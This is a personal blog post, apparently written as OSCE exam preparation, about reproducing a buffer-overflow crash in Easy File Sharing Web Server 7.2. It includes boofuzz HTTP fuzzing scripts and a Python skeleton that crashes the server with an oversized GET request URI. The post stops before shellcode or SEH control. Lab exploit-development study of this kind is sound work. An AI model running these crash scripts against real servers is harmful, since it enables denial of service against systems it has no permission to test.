---
layout: single
title: CTP/OSCE Prep -- Easy File Sharing Web Server 7.2 SEH Overwrite
date: 2019-6-13
classes: wide
header:
  teaser: /assets/images/CTP/immunity.jpg
tags:
  - buffer overflow
  - Windows
  - x86
  - shellcoding
  - exploit development
  - assembly
  - python
  - OSCE
  - CTP
--- 
![](/assets/images/CTP/1920x1080_Wallpaper.jpg)

## Introduction

This series of posts will focus on the concepts I'm learning/practicing in preparation for [CTP/OSCE](https://www.offensive-security.com/information-security-training/cracking-the-perimeter/). In this series of posts, I plan on exploring:
+ fuzzing,
+ vanilla EIP overwrite,
+ SEH overwrite, and
+ egghunters.

Writing these entries will force me to become intimately familiar with these topics, and hopefully you can get something out of them as well! 

This particular post is about recreating an SEH Overwrite from an ExploitDB entry.

## Finding a Candidate Exploit

Since I've just about finished all of the Vulnserver exploits and have gone through most of the CTP material, I figured it's time to start getting some experience recreating real world exploits from scratch. I searched for 'SEH' on ExploitDB and settled on the [Easy File Sharing Web Server 7.2](https://www.exploit-db.com/exploits/39008) exploit. I picked this exploit in particular because up to this point I have not done much exploit developement with webservers, most of my experience has come from Vulnserver.  

## Fuzzing

The very first thing I did after downloading and installing the software from [here](http://www.sharing-file.com/) was look for `boofuzz` http fuzzing templates. The first one I came to was [here](https://github.com/jtpereyda/boofuzz-http) and has the following source code: 
```python
#!/usr/bin/env python
# Designed for use with boofuzz v0.0.9
from boofuzz import *


def main():
    session = Session(
        target=Target(
            connection=SocketConnection("127.0.0.1", 80, proto='tcp')
        ),
    )

    s_initialize(name="Request")
    with s_block("Request-Line"):
        s_group("Method", ['GET', 'HEAD', 'POST', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE'])
        s_delim(" ", name='space-1')
        s_string("/index.html", name='Request-URI')
        s_delim(" ", name='space-2')
        s_string('HTTP/1.1', name='HTTP-Version')
        s_static("\r\n", name="Request-Line-CRLF")
    s_static("\r\n", "Request-CRLF")

    session.connect(s_get("Request"))

    session.fuzz()


if __name__ == "__main__":
    main()
```

The first thing I noticed was that the script creates a list of HTTP methods for `boofuzz` to craft packets from, fuzzes the `s_delim` entities `'space-1'` and `'space-2'`, and fuzzes `s_string` entities `'Request-URI'` and `'HTTP-Version'`. `boofuzz` does not fuzz `s_static` entities. 

As you can probably gather, this isn't a super in-depth fuzzing script but it's a great start. It's going to test several HTTP methods and it's going to fuzz about 4 values. Other standard HTTP request fields (such as User Agent) will not be fuzzed, but we can save that for another time.

After a round of fuzzing, the application crashes relatively closely and as you can see from the screenshot, we notice EAX has been overwritten with `C` values. 

![](/assets/images/CTP/efscrash1.JPG)

Looking through the payloads sent in the `boofuzz-results` folder, the only payload I could find mention of with `C` values was a 512 byte payload sent in the following format: `GET (C*n) `. This led me to believe that the field responsible for the crash was the value after the space in the `GET` request which in our case was the `'Request-URI'` `s_string` entity (`/index.html`). 

![](/assets/images/CTP/boofuzzresults.JPG)

It was pretty frustrating not seeing any reference to larger payloads sent by `boofuzz` in the results folder but at least I was able to sort of piece together the format that led to the crash. Terminal output payloads were as large as 100k bytes. I decided to se all of the other fuzzable entities in our `boofuzz` script to not fuzzable to test my half-baked theory. So now our `boofuzz` script looks like this: 
```python
#!/usr/bin/python

from boofuzz import *


def main():
    session = Session(
        target=Target(
            connection=SocketConnection("192.168.1.201", 80, proto='tcp')
        ),
    )

    s_initialize(name="Request")
    with s_block("Request-Line"):
        s_group("Method", ['GET', 'HEAD', 'POST', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE'])
        s_delim(" ", name='space-1', fuzzable = False)
        s_string("/index.html", name='Request-URI')
        s_delim(" ", name='space-2', fuzzable = False)
        s_string('HTTP/1.1', name='HTTP-Version', fuzzable = False)
        s_static("\r\n", name="Request-Line-CRLF")
    s_static("\r\n", "Request-CRLF")

    session.connect(s_get("Request"))

    session.fuzz()


if __name__ == "__main__":
    main()
```

Again we get a crash and EAX is overwritten with `C` values. So we know for certain the `'Request-URI'` entity is vulnerable. Time to create a skeleton and recreate the crash. 

![](/assets/images/CTP/efscrash2.JPG)

## Skeleton Exploit

The first thing I did at this point was google for 'http skeleton exploits' and came across this [github repo](https://github.com/HanseSecure/ExploitDev/tree/master/poc) which included an http exploit skeleton. After modifying it slightly to fit my personal taste and our vulnerability analysis up to this point, our skeleton looks like this:
```python
import socket
import os
import sys

ip = "192.168.1.201"
port = 80

crash = "A" * 5000


buffer="GET "
buffer+=crash
buffer+=" HTTP/1.1\r\n"

expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
expl.connect((ip, port))
expl.send(buffer)
expl.close()
```

## Resources

+ 
